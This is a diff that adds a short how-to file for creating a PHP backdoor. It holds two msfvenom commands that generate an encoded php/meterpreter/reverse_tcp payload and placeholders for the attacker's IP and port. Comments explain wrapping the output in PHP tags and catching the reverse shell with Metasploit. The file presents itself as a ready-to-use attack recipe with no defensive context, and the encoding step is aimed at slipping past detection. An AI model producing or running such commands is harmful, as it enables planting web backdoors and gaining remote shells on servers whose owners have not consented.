@@ -1,0 +1,6 @@
+# Creat php backdoor file
+# Don't forget to add "<?php " and " ?>" in to msfvenom.php file
+# And listeng using metasploit :)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[your ip] LPORT=[your port] -e php/base64 -i 5(how many encoding you given) -f raw -o /root/yourbackdoorname.php
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[your ip] LPORT=[your port] -e php/base64 -f raw > /root/Desktop/yourbackdoorname.php
